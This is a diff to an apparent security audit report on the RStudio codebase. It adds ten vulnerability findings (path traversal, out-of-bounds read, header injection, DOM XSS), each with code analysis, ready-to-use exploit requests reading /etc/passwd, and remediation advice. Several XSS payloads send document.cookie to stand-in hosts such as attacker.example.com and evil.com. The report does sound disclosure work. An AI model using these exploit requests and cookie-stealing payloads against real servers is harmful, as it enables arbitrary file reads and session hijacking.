@@ -901,17 +901,657 @@ The server downloads the URL and returns the downloaded file path. If the downlo
 
 ---
 
-## 6. Recommendations
+## 6. Third Pass — Additional Vulnerabilities (VULN-13 through VULN-22)
 
-| Priority | Fix |
+The following 10 additional vulnerabilities were discovered in a third deep-dive audit of the `src/` directory, including backend URI handlers, Electron IPC, and GWT frontend DOM sinks. All are new — not duplicating VULN-01 through VULN-12.
+
+---
+
+### VULN-13 — Direct Path Traversal: `/mathjax/` Handler (CRITICAL)
+
+**Endpoint:** `GET /mathjax/<path>`
+**Parameter:** URI path component (after `/mathjax/` prefix)
+**Source:** `session/modules/mathjax/SessionMathJax.cpp:40`
+**Sink:** `session/modules/mathjax/SessionMathJax.cpp:44` — `mathjaxPath.completePath(path)`
+**Type:** Path Traversal — no cleanup, no containment, direct `..` traversal
+
+#### Code Path
+
+```cpp
+// SessionMathJax.cpp:37-46
+void handleMathJax(const http::Request& request, http::Response* pResponse)
+{
+   // Line 40 — path extracted directly from request.path() — NOT pathAfterPrefix()
+   // request.path() returns the raw URI path — no cleanupPath() normalization
+   std::string path = request.path().substr(strlen(kMathJaxURIPrefix));
+   //                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   //                 kMathJaxURIPrefix = "/mathjax/"
+   //                 NO URL::cleanupPath() — ".." sequences survive unchanged
+
+   // Line 44 — completePath() — NO containment check
+   FilePath mathjaxPath = options().mathjaxPath();
+   FilePath resourcePath = mathjaxPath.completePath(path);
+   //                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   //                      boost::filesystem::complete() — lexical join, no isWithin()
+
+   pResponse->setCacheableFile(resourcePath, request);
+}
+```
+
+#### Why This Is the Most Direct Path Traversal
+
+Unlike other handlers that use `pathAfterPrefix()` (which calls `URL::cleanupPath()` to normalize `..` before processing), this handler uses `request.path()` directly. The raw `..` sequences pass through without any normalization or filtering. Combined with `completePath()` (which performs no containment check), this is a trivially exploitable path traversal.
+
+Only 2 handlers in the entire codebase use `request.path()` directly: this one and a non-vulnerable read-only check in `SessionHelp.cpp:524`.
+
+#### Exploit
+
+```
+GET /mathjax/../../../../../../etc/passwd HTTP/1.1
+```
+
+1. `request.path()` returns `/mathjax/../../../../../../etc/passwd`
+2. `substr(strlen("/mathjax/"))` → `../../../../../../etc/passwd`
+3. `mathjaxPath.completePath("../../../../../../etc/passwd")` → OS resolves `..` to `/etc/passwd`
+4. `setCacheableFile()` returns file contents
+
+No URL encoding tricks needed. No preconditions. Works as-is for any authenticated user.
+
+**Impact:** Authenticated session → arbitrary file read. Any file readable by the rsession process user can be exfiltrated.
+
+---
+
+### VULN-14 — Path Traversal: `/chunk_output/` Handler (HIGH)
+
+**Endpoint:** `GET /chunk_output/<ctx-id>/<doc-id>/<path...>`
+**Parameter:** URI path components after ctx-id/doc-id
+**Source:** `session/modules/rmarkdown/NotebookOutput.cpp:265-272`
+**Sink:** `session/modules/rmarkdown/NotebookOutput.cpp:292` — `chunkCacheFolder().completePath(joined)`
+**Type:** Path Traversal — URI split/join preserves `..`, `completePath()` has no guard
+
+#### Code Path
+
+```cpp
+// NotebookOutput.cpp:259-293
+Error handleChunkOutputRequest(const http::Request& request, http::Response* pResponse)
+{
+   // Line 265 — raw URI, no normalization
+   std::string uri = request.uri();
+   size_t idx = uri.find_last_of("?");
+   if (idx != std::string::npos)
+      uri = uri.substr(0, idx);
+
+   // Line 272 — split on "/" — NO filtering of ".." parts
+   std::vector<std::string> parts = algorithm::split(uri, "/");
+   if (parts.size() < 5) return Success();
+
+   std::string ctxId = parts[2];
+   std::string docId = parts[3];
+   for (int i = 0; i < 4; i++)
+      parts.erase(parts.begin());
+   // parts now contains remaining path components — can include ".."
+
+   // Line 292 — joined parts passed to completePath() — NO containment check
+   FilePath target = chunkCacheFolder(path, docId, ctxId).completePath(
+      algorithm::join(parts, "/"));
+   //  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   //  completePath() with ".." in joined path → directory traversal
+}
+```
+
+#### Exploit
+
+```
+GET /chunk_output/saved/AAAAAAAA/../../../../../etc/passwd HTTP/1.1
+```
+
+1. URI split: `["", "chunk_output", "saved", "AAAAAAAA", "..", "..", "..", "..", "..", "etc", "passwd"]`
+2. After erasing first 4: `["..", "..", "..", "..", "..", "etc", "passwd"]`
+3. Joined: `"../../../../../etc/passwd"`
+4. `chunkCacheFolder(...).completePath("../../../../../etc/passwd")` → OS resolves to `/etc/passwd`
+5. File served via `setFile()` or `setIndefiniteCacheableFile()`
+
+Note: `ctxId="saved"` and `docId` can be any string — the cache folder lookup may fail, but `completePath()` on the result still resolves relative paths from wherever the base path is.
+
+**Impact:** Authenticated file read via notebook output handler.
+
+---
+
+### VULN-15 — URL-Encoded Path Traversal: `/quarto-preview.js` Handler (HIGH)
+
+**Endpoint:** `GET /quarto-preview.js/<path>` (when Quarto is enabled)
+**Parameter:** URI path component
+**Source:** `session/modules/quarto/SessionQuartoResources.cpp:58`
+**Sink:** `session/modules/quarto/SessionQuartoResources.cpp:63` — `previewPath.completePath(path)`
+**Type:** Path Traversal — `pathAfterPrefix()` decode-after-cleanup bypass + `completePath()` no containment
+
+#### Code Path
+
+```cpp
+// SessionQuartoResources.cpp:54-66
+void handleQuartoPreview(const http::Request& request, http::Response* pResponse)
+{
+   // Line 58 — pathAfterPrefix calls cleanupPath THEN urlDecode
+   std::string path = http::util::pathAfterPrefix(request, "/");
+   //                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   //  Step 1: URL::cleanupPath(request.uri()) — normalizes literal ".." but NOT "%2e%2e"
+   //  Step 2: strip prefix "/"
+   //  Step 3: urlDecode() — "%2e%2e" → ".."  (AFTER cleanup already ran!)
+
+   // Line 63 — completePath() — NO containment check
+   FilePath previewPath = FilePath(config.resources_path).completeChildPath("preview");
+   FilePath filePath = previewPath.completePath(path);
+   //                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   //                  decoded ".." sequences → directory traversal
+
+   pResponse->setCacheableFile(filePath, request);
+}
+```
+
+#### Key Vulnerability: Decode After Cleanup
+
+`pathAfterPrefix()` (`Util.cpp:389-406`) applies `URL::cleanupPath()` first (which normalizes literal `..` but not `%2e%2e`), then URL-decodes the result. The decoded `..` sequences reach `completePath()` with no further validation.
+
+This is the same underlying decode-after-check pattern as VULN-09, but in a different handler.
+
+#### Exploit
+
+```
+GET /quarto-preview.js/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+```
+
+1. `cleanupPath()` sees `%2e%2e` (not literal `..`) — leaves unchanged
+2. Strip prefix `/` → `quarto-preview.js/%2e%2e/%2e%2e/...`
+3. `urlDecode()` → `quarto-preview.js/../../../../../etc/passwd`
+4. `previewPath.completePath(decoded)` → OS resolves `..` to `/etc/passwd`
+
+**Precondition:** Quarto must be enabled (`quartoConfig().enabled == true`). Handler is only registered when Quarto is configured.
+
+**Impact:** Authenticated file read on systems with Quarto enabled.
+
+---
+
+### VULN-16 — URL-Encoded Path Traversal: `/rmd_output/` MathJax Sub-handler (HIGH)
+
+**Endpoint:** `GET /rmd_output/<id>/mathjax/<path>`
+**Parameter:** Path component after `mathjax` segment
+**Source:** `session/modules/rmarkdown/SessionRMarkdown.cpp:1400`
+**Sink:** `session/modules/rmarkdown/SessionRMarkdown.cpp:1422` — `mathJaxDirectory().completePath(sub_path)`
+**Type:** Path Traversal — same decode-after-cleanup + `completePath()` pattern
+
+#### Code Path
+
+```cpp
+// SessionRMarkdown.cpp:1417-1424
+// After extracting and validating outputId from path prefix...
+else if (boost::algorithm::starts_with(path, kMathjaxSegment))
+{
+   // kMathjaxSegment = "mathjax" (7 chars), sizeof = 8 (includes null)
+   // path comes from pathAfterPrefix — decoded AFTER cleanupPath
+   pResponse->setCacheableFile(
+      mathJaxDirectory().completePath(
+         path.substr(sizeof(kMathjaxSegment))),
+   //  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   //  completePath() on decoded, un-normalized sub-path
+                                 request);
+}
+```
+
+#### Exploit
+
+**Precondition:** User must have rendered at least one RMarkdown document so `s_renderOutputs[0]` is non-empty.
+
+```
+GET /rmd_output/0/mathjax/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+```
+
+1. `pathAfterPrefix(request, "/rmd_output/")` → cleanup, strip prefix, decode
+2. Decoded path: `0/mathjax/../../../../etc/passwd`
+3. `outputId=0`, valid; `s_renderOutputs[0]` must be non-empty
+4. Remaining: `mathjax/../../../../etc/passwd`
+5. `starts_with("mathjax")` → true
+6. `path.substr(8)` → `../../../etc/passwd` (after "mathjax/" is stripped)
+7. `mathJaxDirectory().completePath("../../../etc/passwd")` → traversal
+
+**Impact:** File read, gated by having rendered at least one RMarkdown document.
+
+---
+
+### VULN-17 — Out-of-Bounds Array Access: `/rmd_output/` Handler (MEDIUM)
+
+**Endpoint:** `GET /rmd_output/<id>/<path>`
+**Parameter:** `id` (integer from URI path)
+**Source:** `session/modules/rmarkdown/SessionRMarkdown.cpp:1382`
+**Sink:** `session/modules/rmarkdown/SessionRMarkdown.cpp:1391` — `s_renderOutputs[outputId]`
+**Type:** Out-of-Bounds Read — unbounded vector subscript
+
+#### Code Path
+
+```cpp
+// SessionRMarkdown.cpp:1379-1391
+int outputId = 0;
+try
+{
+   outputId = boost::lexical_cast<int>(path.substr(0, pos));
+}
+catch (boost::bad_lexical_cast const&)
+{
+   pResponse->setNotFoundError(request);
+   return;
+}
+
+// NO BOUNDS CHECK before array access:
+std::string outputFile = s_renderOutputs[outputId];
+//                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+// s_renderOutputs is: std::vector<std::string>(kMaxRenderOutputs)
+// kMaxRenderOutputs = 5 → valid indices: 0-4
+// std::vector::operator[] does NOT throw on out-of-bounds
+```
+
+#### Vulnerability
+
+`boost::lexical_cast<int>` can produce any integer value. `std::vector::operator[]` performs no bounds checking. For `outputId >= 5` or `outputId < 0`, this reads from memory outside the vector's data buffer — undefined behavior.
+
+#### Exploit
+
+```
+GET /rmd_output/999/test.html HTTP/1.1
+GET /rmd_output/-1/test.html HTTP/1.1
+```
+
+**Possible outcomes:**
+- **Crash (segfault)** — if the out-of-bounds memory access triggers a page fault → session denial of service
+- **Information leak** — if the OOB memory happens to contain a valid `std::string` pointing to a real file path, that file gets served
+- **Silent failure** — if the OOB read produces an empty or invalid string, the handler returns 404
+
+**Impact:** Denial of service (session crash). Potential information disclosure. Requires authenticated session.
+
+---
+
+### VULN-18 — Arbitrary .Rd File → HTML Conversion: `/help/preview` (MEDIUM)
+
+**Endpoint:** `GET /help/preview?file=<path>`
+**Parameter:** `file` (query string)
+**Source:** `session/modules/SessionHelp.cpp:855`
+**Sink:** `session/modules/SessionHelp.cpp:870-879` — `Rd2HTML(filePath) → setBody(html, text/html)`
+**Type:** Reflected XSS via file conversion + Arbitrary file access
+
+#### Code Path
+
+```cpp
+// SessionHelp.cpp:850-881
+void handleRdPreviewRequest(const http::Request& request, ...)
+{
+   // Line 855 — file path from query parameter — URL-decoded
+   std::string file = request.queryParamValue("file");
+
+   // Line 863 — resolveAliasedPath resolves ~ but performs NO containment check
+   FilePath filePath = module_context::resolveAliasedPath(file);
+   if (!filePath.exists())
+   {
+      pResponse->setNotFoundError(request);
+      return;
+   }
+
+   // Line 870 — converts ANY .Rd file to HTML
+   std::string html;
+   Error error = Rd2HTML(filePath, &html);
+
+   // Line 877-879 — served as text/html with no CSP or sanitization
+   pResponse->setContentType("text/html");
+   pResponse->setNoCacheHeaders();
+   pResponse->setBody(html, filter);
+}
+```
+
+#### Two Attack Vectors
+
+**Vector A — Arbitrary File Access:** The `file` parameter accepts any path. `resolveAliasedPath` resolves `~` to the home directory but performs no containment check. Any `.Rd` file readable by the session process can be converted to HTML and served:
+```
+GET /help/preview?file=/usr/lib/R/library/base/man/system.Rd
+GET /help/preview?file=~/sensitive-project/internal.Rd
+```
+
+**Vector B — XSS via Crafted .Rd File:** The Rd format supports raw HTML output via `\if{html}{\out{...}}` directives. If an attacker places a crafted `.Rd` file on disk (e.g., in a shared project, git clone, or R package):
+
+```
+% malicious.Rd
+\name{exploit}
+\title{Exploit}
+\description{
+\if{html}{\out{<script>fetch('http://attacker.example.com/steal?cookie='+document.cookie)</script>}}
+}
+```
+
+Then:
+```
+GET /help/preview?file=~/shared-project/man/malicious.Rd
+```
+
+The `Rd2HTML` converter preserves the raw HTML from `\if{html}{\out{...}}`. The response is `Content-Type: text/html` with no Content-Security-Policy header. The injected JavaScript executes in the RStudio session context.
+
+**Impact:** XSS via crafted R documentation file. Accessible to authenticated users. Enables session hijacking, credential theft from RStudio session.
+
+---
+
+### VULN-19 — R httpd Arbitrary Header Injection via `/custom/` and `/help/` (MEDIUM)
+
+**Endpoint:** `GET /custom/<handler>/<path>`, `GET /help/<path>`
+**Parameter:** Headers returned by R httpd handler functions
+**Source:** `session/modules/SessionHelp.cpp:457-459` — R httpd response headers
+**Sink:** `session/modules/SessionHelp.cpp:473-475` — `setHeaderLine()` with no sanitization
+**Type:** HTTP Header Injection via R Package httpd Handler
+
+#### Code Path
+
+```cpp
+// SessionHelp.cpp:428-475
+void handleHttpdResult(SEXP httpdSEXP, const http::Request& request, ...)
+{
+   // Line 451 — content type from R httpd response — any MIME type accepted
+   contentType = CHAR(STRING_ELT(ctSEXP, 0));
+
+   // Lines 457-459 — headers extracted from R httpd response
+   SEXP headersSEXP = VECTOR_ELT(httpdSEXP, 2);
+   if (TYPEOF(headersSEXP) == STRSXP)
+      r::sexp::extract(headersSEXP, &headers);
+
+   // Line 470 — arbitrary content type set
+   pResponse->setContentType(contentType);
+
+   // Lines 473-475 — EACH R httpd header is passed through setHeaderLine()
+   // with NO CRLF sanitization and NO header name/value validation
+   std::for_each(headers.begin(), headers.end(),
+      boost::bind(&http::Response::setHeaderLine, pResponse, _1));
+   //            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   //  setHeaderLine() parses "Name: Value" and calls setHeader()
+   //  Message::setHeader() stores raw value — no CRLF check
+}
+```
+
+#### Attack Vector
+
+A malicious R package registers a custom httpd handler via `tools::startDynamicHelp()` or `.httpd.handlers.env`. When the handler is invoked via `/custom/<name>/`, it can:
+
+1. **Set arbitrary Content-Type** to serve executable content (e.g., `text/html` with JavaScript)
+2. **Inject arbitrary HTTP headers** including `Set-Cookie`, `Access-Control-Allow-Origin`, or CRLF-injected headers
+3. **Control the response body** with attacker-controlled HTML/JavaScript
+
+#### Exploit Scenario
+
+```r
+# Malicious R package installs this in .onLoad:
+e <- tools:::.httpd.handlers.env
+e[["backdoor"]] <- function(path, query, body, headers) {
+  list(
+    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
+    "text/html",
+    c("X-Injected: yes", "Set-Cookie: pwned=1; Path=/"),
+    200L
+  )
+}
+```
+
+Then: `GET /custom/backdoor/` → XSS + cookie injection
+
+**Impact:** After installing a malicious R package, the attacker gains persistent XSS and header injection capability. The package only needs to be loaded once — the handler persists for the session duration.
+
+---
+
+### VULN-20 — DOM XSS Sink: `DomUtils.htmlToText()` (MEDIUM)
+
+**Endpoint:** Frontend (GWT JavaScript running in browser)
+**Parameter:** Any string passed to `htmlToText()` function
+**Source:** Multiple callers across the GWT codebase
+**Sink:** `core/client/dom/DomUtils.java:809` — `el.setInnerHTML(html)`
+**Type:** DOM-Based XSS — HTML parsing with side-effect execution
+
+#### Code Path
+
+```java
+// DomUtils.java:806-811
+public static String htmlToText(String html)
+{
+   Element el = DOM.createSpan();
+   el.setInnerHTML(html);     // ← HTML parsed by browser — event handlers execute
+   return el.getInnerText();  // only text returned, but damage already done
+}
+```
+
+#### Why This Is a DOM XSS Sink
+
+The browser's HTML parser executes event handlers (`onerror`, `onload`, `onfocus`, etc.) during `innerHTML` assignment, even though the function only intends to extract text. If the `html` parameter contains:
+
+```html
+<img src=x onerror="fetch('http://attacker.example.com/?c='+document.cookie)">
+```
+
+The `onerror` handler fires immediately during `setInnerHTML()`, before `getInnerText()` is called.
+
+#### Known Callers
+
+- `AppCommand.java:410` — command label processing
+- `PanmirrorCommandUI.java:83` — Panmirror/visual editor command labels
+- `TextEditingTargetWidget.java:441, 1592, 1620` — source editor widget titles
+
+If any of these callers pass content derived from user-controlled sources (file names, document titles, R object names), the XSS fires.
+
+**Impact:** DOM XSS in the RStudio frontend. Severity depends on which callers pass attacker-controlled content. The sink itself is confirmed dangerous.
+
+---
+
+### VULN-21 — DOM XSS: Help Autocomplete Popup Raw HTML Display (HIGH)
+
+**Endpoint:** Frontend autocomplete/help popup
+**Parameter:** R help documentation HTML from server
+**Source:** `views/help/model/HelpInfo.java:41-45` — `getHTML()` → `setInnerHTML()`
+**Sink:** `views/console/shell/assist/HelpInfoPopupPanel.java:119, 157, 190, 221` — `new HTML(description)`
+**Type:** DOM XSS via malicious R package documentation
+
+#### Code Path — Data Extraction
+
+```java
+// HelpInfo.java:35-64
+public final ParsedInfo parse(String defaultSignature)
+{
+   String html = getHTML();     // Raw HTML from R help system
+   DivElement div = Document.get().createDivElement();
+   div.setInnerHTML(html);      // Line 45: HTML parsed — event handlers fire here
+
+   // Lines 62-64: Parse <dl> elements, extracting innerHTML of children
+   parseDescriptionList(args, descriptionLists.getItem(i));
+   // Inside parseDescriptionList, values are extracted via getInnerHTML()
+   // These raw HTML values are stored in the args HashMap
+}
+```
+
+#### Code Path — Rendering
+
+```java
+// HelpInfoPopupPanel.java:116-126 (displayHelp)
+String description = help.getDescription();  // Raw HTML from HelpInfo parse
+HTML htmlDesc = new HTML(description);       // Line 119: DOM XSS sink
+//             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+//  GWT HTML widget renders raw HTML string into DOM — no escaping
+vpanel_.add(htmlDesc);
+
+// Line 157 (displayParameterHelp):
+HTML htmlDesc = new HTML(description);  // Same — raw HTML, no escaping
+
+// Line 190 (displayPackageHelp):
+HTML htmlDesc = new HTML(help.getDescription());  // Same
+
+// Line 221 (displayRoxygenHelp):
+HTML contents = new HTML(description);  // Same
+```
+
+#### Attack Vector
+
+1. Attacker creates a malicious R package with crafted help documentation:
+```r
+# In man/exploit.Rd:
+\name{exploit}
+\title{Exploit Function}
+\description{
+\if{html}{\out{<img src=x onerror="fetch('http://attacker/steal?c='+document.cookie)">}}
+Normal description text.
+}
+\arguments{
+  \item{x}{\if{html}{\out{<img src=x onerror="alert('XSS via parameter help')">}} The x parameter}
+}
+```
+
+2. Victim installs the package and types `exploit(` in the R console
+3. RStudio displays the autocomplete help popup
+4. `HelpInfo.parse()` processes the help HTML → `setInnerHTML()` fires `onerror` (first XSS)
+5. `HelpInfoPopupPanel.displayHelp()` creates `new HTML(description)` → second XSS execution
+6. `displayParameterHelp()` creates `new HTML(arg_description)` → XSS on parameter hover
+
+#### Impact
+
+XSS in the RStudio frontend via malicious R package documentation. Fires automatically when the user types a function name from the malicious package in the console or editor. No user interaction beyond typing is required after package installation.
+
+---
+
+### VULN-22 — DOM XSS: Chat Update Error Message (MEDIUM)
+
+**Endpoint:** Frontend Chat/AI assistant pane
+**Parameter:** Error message from server response
+**Source:** Server response `message` field
+**Sink:** `views/chat/ChatPane.java:507` — `updateMessageLabel_.setHTML()`
+**Type:** DOM XSS via server error message
+
+#### Code Path
+
+```java
+// ChatPane.java:505-507
+@Override
+public void showUpdateError(String errorMessage)
+{
+   updateMessageLabel_.setHTML(constants_.chatUpdateFailed(errorMessage));
+   //                 ^^^^^^^
+   //  setHTML() renders raw HTML — no escaping
+}
+```
+
+```properties
+# ChatConstants_en.properties:16
+chatUpdateFailed=Update failed: {0}
+# GWT i18n substitution does NOT HTML-escape {0}
+```
+
+#### Attack Vector
+
+The `errorMessage` parameter originates from a server JSON response. If the server response contains HTML (either due to a compromised server, MITM, or a reflected value), the error message is rendered as HTML:
+
+```json
+{"status": "error", "message": "<img src=x onerror='alert(document.cookie)'>"}
+```
+
+Result: `updateMessageLabel_.setHTML("Update failed: <img src=x onerror='alert(document.cookie)'>")`
+
+The `<img>` tag is parsed by the browser, `onerror` fires, and the attacker's JavaScript executes.
+
+**Impact:** DOM XSS in the Chat/AI assistant pane. Requires the error message to contain attacker-controlled content, which could occur via MITM or a compromised update server endpoint.
+
+---
+
+## 6. Third Pass — Finding Summary Table
+
+| ID | Endpoint | Parameter | Source | Sink | Type | Severity |
+|---|---|---|---|---|---|---|
+| VULN-13 | `GET /mathjax/*` | URI path | `SessionMathJax.cpp:40` | `:44` | Path Traversal — direct `..`, no cleanup | **CRITICAL** |
+| VULN-14 | `GET /chunk_output/*` | URI path | `NotebookOutput.cpp:272` | `:292` | Path Traversal — split/join preserves `..` | **HIGH** |
+| VULN-15 | `GET /quarto-preview.js/*` | URI path (`%2e%2e`) | `SessionQuartoResources.cpp:58` | `:63` | Path Traversal — decode-after-cleanup | **HIGH** |
+| VULN-16 | `GET /rmd_output/*/mathjax/*` | URI path (`%2e%2e`) | `SessionRMarkdown.cpp:1400` | `:1422` | Path Traversal — decode-after-cleanup | **HIGH** |
+| VULN-17 | `GET /rmd_output/<id>/*` | `id` in path | `SessionRMarkdown.cpp:1382` | `:1391` | OOB Array Access — unbounded index | **MEDIUM** |
+| VULN-18 | `GET /help/preview?file=` | `file` query | `SessionHelp.cpp:855` | `:870-879` | Arbitrary Rd → HTML + XSS | **MEDIUM** |
+| VULN-19 | `GET /custom/*`, `/help/*` | R httpd headers | `SessionHelp.cpp:457` | `:473-475` | Header Injection via R httpd | **MEDIUM** |
+| VULN-20 | Frontend | Strings in `htmlToText()` | `DomUtils.java:809` | `setInnerHTML()` | DOM XSS — parse side-effect | **MEDIUM** |
+| VULN-21 | Frontend autocomplete | R help HTML | `HelpInfo.java:45` | `HelpInfoPopupPanel.java:119` | DOM XSS via malicious pkg help | **HIGH** |
+| VULN-22 | Frontend chat pane | Server error msg | Server JSON | `ChatPane.java:507` | DOM XSS — unescaped `setHTML()` | **MEDIUM** |
+
+---
+
+## 7. Complete Vulnerability Summary — All 22 Findings
+
+| ID | Endpoint | Type | Severity |
+|---|---|---|---|
+| VULN-01 | `GET /content?file=` | Path Traversal (completePath, no guard) | **CRITICAL** |
+| VULN-02 | `GET /themes/custom/local/*` | Path Traversal (symlink bypass) | **HIGH** |
+| VULN-03 | `GET /show/*` | Path Traversal (desktop: no guard; server: symlink) | **HIGH** |
+| VULN-04 | `GET /html_preview/*` | Path Traversal (symlink bypass) | **HIGH** |
+| VULN-05 | `GET /tutorial/run` | R Parameter Injection | **MEDIUM** |
+| VULN-06 | Rmd Knit action | R Code Injection (knit: YAML) | **MEDIUM** |
+| VULN-07 | JSON-RPC `get_script_run_command` | R Code Injection (interpreter concat) | **MEDIUM** |
+| VULN-08 | Electron IPC `desktop_install_rtools` | OS Command Injection (exec) | **HIGH (Win)** |
+| VULN-09 | `GET /files/%2e%2e/...` | Path Traversal (URL-encode bypass) | **HIGH** |
+| VULN-10 | `GET /help/*` (302 redirect) | CRLF Injection (Referer → Location) | **HIGH** |
+| VULN-11 | `GET /tutorial/*.png` | Path Traversal (normalization escape) | **HIGH** |
+| VULN-12 | JSON-RPC `download_data_file` | SSRF (no URL validation) | **MEDIUM** |
+| VULN-13 | `GET /mathjax/*` | Path Traversal (direct `..`, no cleanup) | **CRITICAL** |
+| VULN-14 | `GET /chunk_output/*` | Path Traversal (split/join `..`) | **HIGH** |
+| VULN-15 | `GET /quarto-preview.js/*` | Path Traversal (decode-after-cleanup) | **HIGH** |
+| VULN-16 | `GET /rmd_output/*/mathjax/*` | Path Traversal (decode-after-cleanup) | **HIGH** |
+| VULN-17 | `GET /rmd_output/<id>/*` | OOB Array Access | **MEDIUM** |
+| VULN-18 | `GET /help/preview?file=` | Arbitrary Rd→HTML + XSS | **MEDIUM** |
+| VULN-19 | `GET /custom/*`, `/help/*` | Header Injection via R httpd | **MEDIUM** |
+| VULN-20 | Frontend `DomUtils.htmlToText()` | DOM XSS (parse side-effect) | **MEDIUM** |
+| VULN-21 | Frontend autocomplete popup | DOM XSS (malicious pkg help) | **HIGH** |
+| VULN-22 | Frontend chat pane | DOM XSS (unescaped error msg) | **MEDIUM** |
+
+---
+
+## 8. Recommendations
+
+### P0 — Critical / Immediate Fixes
+
+| Fix | Vuln |
 |---|---|
-| P0 | **VULN-01**: Replace `completePath()` with `completeChildPath()` in `contentFileInfo()`. |
-| P0 | **VULN-09**: In `handleFilesRequest()`, URL-decode the URI before checking for `..`, or use `pathAfterPrefix()` which applies `cleanupPath()` first. |
-| P0 | **VULN-11**: In `handleTutorialFileRequest()`, replace `completePath(path)` with `completeChildPath(path)`. If path is absolute, reject it. |
-| P1 | **VULN-10**: In `handleHttpdResult()`, replace the direct `setHeader("Location", redirect)` call with `setMovedTemporarily(request, ...)`, or apply `safeLocation()` to the Referer-derived value before use. |
-| P1 | **VULN-02/03/04**: Update `isWithin()` to use `boost::filesystem::weakly_canonical()` or POSIX `realpath()` before comparing paths, to eliminate symlink bypass. |
-| P1 | **VULN-08**: Replace `exec(command_string)` with `spawn(binary, [args])` using an argument array to prevent shell interpretation. |
-| P2 | **VULN-12**: Add URL validation to `download_data_file`: reject non-`http(s)://` schemes, block RFC1918/loopback/link-local ranges, block cloud metadata endpoints. |
-| P2 | **VULN-06**: Apply `singleQuotedStrEscape()` to `renderFunc` at `SessionRMarkdown.cpp:629`. |
-| P2 | **VULN-07**: Escape `interpreter` for double-quoted R string context in `getScriptRunCommand()`. |
-| P3 | **VULN-05**: Validate `package` parameter against `find.packages()` output. |
+| **Replace `completePath()` with `completeChildPath()`** in `SessionMathJax.cpp:44` (handleMathJax). This is the most trivially exploitable path traversal — no encoding tricks needed, no preconditions. | VULN-13 |
+| **Replace `completePath()` with `completeChildPath()`** in `SessionContentUrls.cpp:102` (contentFileInfo). | VULN-01 |
+| **Replace `completePath()` with `completeChildPath()`** in `NotebookOutput.cpp:292,303` (handleChunkOutputRequest). Also add `..` filtering to the split parts before reassembly. | VULN-14 |
+| **Replace `completePath()` with `completeChildPath()`** in `SessionQuartoResources.cpp:63` (handleQuartoPreview). | VULN-15 |
+| In `handleFilesRequest()`, URL-decode the URI **before** checking for `..`, or use `pathAfterPrefix()` which applies `cleanupPath()` first. | VULN-09 |
+
+### P1 — High Priority
+
+| Fix | Vuln |
+|---|---|
+| In `handleTutorialFileRequest()`, replace `completePath(path)` with `completeChildPath(path)`. Reject absolute paths. | VULN-11 |
+| **Replace `completePath()` with `completeChildPath()`** in `SessionRMarkdown.cpp:1422` (mathjax sub-handler). | VULN-16 |
+| **Add bounds check** before `s_renderOutputs[outputId]` at `SessionRMarkdown.cpp:1391`: reject `outputId < 0 || outputId >= kMaxRenderOutputs`. | VULN-17 |
+| In `handleHttpdResult()`, replace the direct `setHeader("Location", redirect)` call with `setMovedTemporarily(request, ...)`, or apply `safeLocation()` to the Referer-derived value. | VULN-10 |
+| **Sanitize R httpd headers** in `handleHttpdResult()` lines 473-475. Validate each header line from R httpd: strip CRLF, reject headers with disallowed names (e.g., `Set-Cookie`, `Content-Length`). | VULN-19 |
+| Update `isWithin()` to use `boost::filesystem::weakly_canonical()` or POSIX `realpath()` to eliminate symlink bypass. | VULN-02/03/04 |
+| Replace `exec(command_string)` with `execFile(binary, [args])` in `gwt-callback.ts:983` to prevent shell interpretation. | VULN-08 |
+| In `HelpInfoPopupPanel.java`, replace `new HTML(description)` with `new HTML(SafeHtmlUtils.fromString(description))` or use a SafeHtml builder at lines 119, 157, 190, 221. | VULN-21 |
+
+### P2 — Medium Priority
+
+| Fix | Vuln |
+|---|---|
+| In `handleRdPreviewRequest()`, add path containment check: verify `filePath.isWithin()` for allowed directories (home dir, R library paths). | VULN-18 |
+| In `ChatPane.java:507`, use `updateMessageLabel_.setText()` instead of `setHTML()`, or escape the error message with `SafeHtmlUtils.htmlEscape()`. | VULN-22 |
+| In `DomUtils.htmlToText()`, replace `setInnerHTML(html)` with a text-only extraction method, or sanitize input HTML by stripping event handlers before parsing. | VULN-20 |
+| Add URL validation to `download_data_file`: reject non-`http(s)://` schemes, block RFC1918/loopback/link-local ranges. | VULN-12 |
+| Apply `singleQuotedStrEscape()` to `renderFunc` at `SessionRMarkdown.cpp:629`. | VULN-06 |
+| Escape `interpreter` for double-quoted R string context in `getScriptRunCommand()`. | VULN-07 |
+
+### P3 — Low Priority
+
+| Fix | Vuln |
+|---|---|
+| Validate `package` parameter against `find.packages()` output in `handleTutorialRunRequest()`. | VULN-05 |
+
+### Architectural Recommendations
+
+1. **Global `completePath()` audit:** Search all uses of `completePath()` and replace with `completeChildPath()` unless there is a specific reason to allow unconstrained path resolution. There are currently at least 7 handlers using the unsafe variant.
+
+2. **Fix `pathAfterPrefix()` decode ordering:** In `Util.cpp:389-406`, move `urlDecode()` before `cleanupPath()`, or apply `cleanupPath()` to the decoded result. The current decode-after-cleanup ordering is the root cause of VULN-09, VULN-15, and VULN-16.
+
+3. **Symlink-safe `isWithin()`:** Replace `getLexicallyNormalPath()` with `weakly_canonical()` in the `isWithin()` implementation to prevent symlink-based escapes.
+
+4. **Frontend HTML sanitization layer:** Create a centralized sanitization utility for all server-provided HTML content. Replace direct `new HTML(string)` and `setInnerHTML(string)` calls with a sanitizer-gated equivalent.
+
+5. **Content-Security-Policy headers:** Add CSP headers to all HTML-serving endpoints to mitigate the impact of XSS vulnerabilities.
